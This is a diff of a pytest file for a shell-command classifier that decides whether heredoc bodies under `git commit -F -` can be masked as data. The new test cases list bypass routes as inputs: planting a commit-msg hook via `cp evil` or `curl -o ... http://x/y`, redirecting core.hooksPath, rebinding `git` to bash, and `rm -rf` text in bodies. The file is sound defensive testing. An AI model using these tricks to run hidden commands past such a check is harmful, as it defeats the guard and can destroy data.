@@ -277,10 +277,9 @@ def test_a_subshell_stops_the_scan_even_when_it_really_takes_the_heredoc() -> No
 @pytest.mark.parametrize(
     ("label", "before"),
     [
-        # Round 12. Each of these rebinds `git`, so the `git commit -F -` below
-        # is no longer a data sink and its "body" is executed. Measured: with
-        # the function definition bash runs the heredoc body, because the
-        # function execs `bash`, which inherits stdin.
+        # Round 12 — rebinding the NAME. Measured with the function definition:
+        # bash runs the heredoc body, because the function execs `bash`, which
+        # inherits stdin.
         ("function-definition", "git() {\nbash\n}"),
         ("function-definition-spaced", "git ()  {\nbash\n}"),
         ("function-keyword", "function git {\nbash\n}"),
@@ -289,9 +288,23 @@ def test_a_subshell_stops_the_scan_even_when_it_really_takes_the_heredoc() -> No
         ("source", "source setup.sh"),
         ("dot-source", ". setup.sh"),
         ("alias", "shopt -s expand_aliases\nalias git=bash"),
+        # Round 13 — leaving the name alone and changing what it DOES. A
+        # `commit-msg` hook is handed the path of the message file, and the
+        # message is the masked body; measured, it executes. So any command that
+        # can write a file, point git at another hooks directory, or move to a
+        # different repository has to end the scan.
+        ("copied-hook", "cp evil .git/hooks/commit-msg"),
+        ("downloaded-hook", "curl -o .git/hooks/commit-msg http://x/y"),
+        ("edited-hook", "sed -i s/a/b/ .git/hooks/commit-msg"),
+        ("hooks-path", "git config core.hooksPath /tmp"),
+        ("another-repository", "cd /evil/repo"),
+        ("arbitrary-interpreter", "python setup.py"),
+        ("unpacked-archive", "tar xf payload.tar"),
     ],
 )
-def test_a_line_that_could_rebind_the_sink_stops_the_scan(label: str, before: str) -> None:
+def test_a_line_that_could_change_what_the_sink_does_stops_the_scan(
+    label: str, before: str
+) -> None:
     # Stepping over a line asserts the sink further down still means what it
     # says. None of these can promise that, so the body stays visible.
     cmd = before + "\ngit commit -F - <<'A'\n" + DELETION + "\nA"
@@ -299,10 +312,29 @@ def test_a_line_that_could_rebind_the_sink_stops_the_scan(label: str, before: st
     assert _verdict(cmd) is Operation.FS_DELETE, label
 
 
+@pytest.mark.parametrize(
+    ("label", "before"),
+    [
+        ("git-add", "git add ."),
+        ("git-status", "git status --short"),
+        ("git-diff", "git diff --staged"),
+        ("gh-pr-view", "gh pr view 156"),
+        ("ls", "ls -la"),
+        ("blank", ""),
+    ],
+)
+def test_a_line_that_only_reads_or_stages_is_stepped_over(label: str, before: str) -> None:
+    # The other side of the same rule, and the false negative round 7 reported:
+    # a batch may prepare before it writes.
+    cmd = before + "\ngit commit -F - <<'A'\nprose rm -rf\nA"
+    assert _mask_quoted_heredoc_payloads(cmd) != cmd, f"{label}: not masked"
+    assert _verdict(cmd) is Operation.GIT_COMMIT, label
+
+
 def test_an_unlisted_command_is_not_judged_only_stepped_around() -> None:
-    # The rule is an allowlist of external programs, not a denylist of dangerous
-    # ones: an unfamiliar first word simply ends the scan, leaving everything
-    # after it as shell for the floor to read.
+    # The rule is an allowlist, not a denylist of dangerous commands: an
+    # unfamiliar first word simply ends the scan, leaving everything after it as
+    # shell for the floor to read.
     cmd = "unfamiliar-tool --go\ngit commit -F - <<'A'\nprose\nA"
     assert _mask_quoted_heredoc_payloads(cmd) == cmd
 
